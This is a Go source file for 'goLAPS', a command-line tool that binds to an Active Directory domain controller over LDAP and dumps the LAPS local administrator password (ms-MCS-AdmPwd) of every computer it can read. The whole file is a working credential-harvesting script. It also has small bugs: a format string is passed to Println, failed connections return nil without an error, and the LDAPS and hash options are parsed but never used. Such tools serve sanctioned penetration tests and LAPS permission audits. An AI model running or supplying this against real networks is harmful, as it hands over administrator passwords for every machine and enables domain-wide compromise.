package main

import (
	"errors"
	"flag"
	"fmt"
	"os"

	"github.com/go-ldap/ldap/v3"
)

func banner() {
	fmt.Println("                __    ___    ____  _____        ")
	fmt.Println("   ____ _____  / /   /   |  / __ \\/ ___/       ")
	fmt.Println("  / __ `/ __ \\/ /   / /| | / /_/ /\\__ \\      ")
	fmt.Println(" / /_/ / /_/ / /___/ ___ |/ ____/___/ /         ")
	fmt.Println(" \\__, /\\____/_____/_/  |_/_/    /____/    v1.2")
	fmt.Println("/____/           @podalirius_                   ")
	fmt.Println("")
}

func ldap_init_connection(host string, port int, username string, domain string, password string) (*ldap.Conn, error) {
	// Check if TCP port is valid
	if port < 1 || port > 65535 {
		fmt.Println("[!] Invalid port number. Port must be in the range 1-65535.")
		return nil, errors.New("invalid port number")
	}

	// Set up LDAP connection
	ldapSession, err := ldap.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
	if err != nil {
		fmt.Println("[!] Error connecting to LDAP server:", err)
		return nil, nil
	}

	// Bind with credentials if provided
	bindDN := ""
	if username != "" {
		bindDN = fmt.Sprintf("%s@%s", username, domain)
	}
	if bindDN != "" && password != "" {
		err = ldapSession.Bind(bindDN, password)
		if err != nil {
			fmt.Println("[!] Error binding:", err)
			return nil, nil
		}
	}

	return ldapSession, nil
}

func ldap_get_rootdse(ldapSession *ldap.Conn) *ldap.Entry {
	// Specify LDAP search parameters
	// https://pkg.go.dev/gopkg.in/ldap.v3#NewSearchRequest
	searchRequest := ldap.NewSearchRequest(
		// Base DN blank
		"",
		// Scope Base
		ldap.ScopeBaseObject,
		// DerefAliases
		ldap.NeverDerefAliases,
		// SizeLimit
		1,
		// TimeLimit
		0,
		// TypesOnly
		false,
		// Search filter
		"(objectClass=*)",
		// Attributes to retrieve
		[]string{"*"},
		// Controls
		nil,
	)

	// Perform LDAP search
	searchResult, err := ldapSession.Search(searchRequest)
	if err != nil {
		fmt.Println("[!] Error searching LDAP:", err)
		return nil
	}

	return searchResult.Entries[0]
}

var (
	useLdaps     bool
	quiet        bool
	debug        bool
	ldapHost     string
	ldapPort     int
	authDomain   string
	authUsername string
	// noPass         bool
	authPassword string
	authHashes   string
	// authKey        string
	// useKerberos    bool
)

func parseArgs() {
	flag.BoolVar(&useLdaps, "use-ldaps", false, "Use LDAPS instead of LDAP.")
	flag.BoolVar(&quiet, "quiet", false, "Show no information at all.")
	flag.BoolVar(&debug, "debug", false, "Debug mode")

	flag.StringVar(&ldapHost, "host", "", "IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If omitted it will use the domain part (FQDN) specified in the identity parameter.")
	flag.IntVar(&ldapPort, "port", 0, "Port number to connect to LDAP server.")

	flag.StringVar(&authDomain, "domain", "", "(FQDN) domain to authenticate to.")
	flag.StringVar(&authUsername, "username", "", "User to authenticate as.")
	//flag.BoolVar(&noPass, "no-pass", false, "don't ask for password (useful for -k)")
	flag.StringVar(&authPassword, "password", "", "password to authenticate with.")
	flag.StringVar(&authHashes, "hashes", "", "NT/LM hashes, format is LMhash:NThash.")
	//flag.StringVar(&authKey, "aes-key", "", "AES key to use for Kerberos Authentication (128 or 256 bits)")
	//flag.BoolVar(&useKerberos, "k", false, "Use Kerberos authentication. Grabs credentials from .ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line")

	flag.Parse()

	if ldapHost == "" {
		fmt.Println("[!] Option -host <host> is required.")
		flag.Usage()
		os.Exit(1)
	}

	if ldapPort == 0 {
		if useLdaps {
			ldapPort = 636
		} else {
			ldapPort = 389
		}
	}

}

func main() {
	banner()
	parseArgs()

	if debug {
		if !useLdaps {
			fmt.Printf("[debug] Connecting to remote ldap://%s:%d ...\n", ldapHost, ldapPort)
		} else {
			fmt.Printf("[debug] Connecting to remote ldaps://%s:%d ...\n", ldapHost, ldapPort)
		}
	}

	// Init the LDAP connection
	ldapSession, err := ldap_init_connection(ldapHost, ldapPort, authUsername, authDomain, authPassword)
	if err != nil {
		fmt.Println("[!] Error searching LDAP:", err)
		return
	}

	rootDSE := ldap_get_rootdse(ldapSession)
	if debug {
		fmt.Printf("[debug] Using defaultNamingContext %s ...\n", rootDSE.GetAttributeValue("defaultNamingContext"))
	}

	// Specify LDAP search parameters
	// https://pkg.go.dev/gopkg.in/ldap.v3#NewSearchRequest
	searchRequest := ldap.NewSearchRequest(
		// Base DN
		rootDSE.GetAttributeValue("defaultNamingContext"),
		// Scope
		ldap.ScopeWholeSubtree,
		// DerefAliases
		ldap.NeverDerefAliases,
		// SizeLimit
		0,
		// TimeLimit
		0,
		// TypesOnly
		false,
		// Search filter
		"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))",
		// Attributes to retrieve
		[]string{"distinguishedName", "ms-MCS-AdmPwd", "sAMAccountName", "objectSid"},
		// Controls
		nil,
	)

	// Perform LDAP search
	fmt.Println("[+] Extracting LAPS passwords of all computers ... ")
	searchResult, err := ldapSession.Search(searchRequest)
	if err != nil {
		fmt.Println("[!] Error searching LDAP:", err)
		return
	}

	// Print search results
	for _, entry := range searchResult.Entries {
		fmt.Println("  | %-20s : %s", entry.GetAttributeValue("sAMAccountName"), entry.GetAttributeValue("ms-MCS-AdmPwd"))
	}

	fmt.Println("[+] All done!")
}
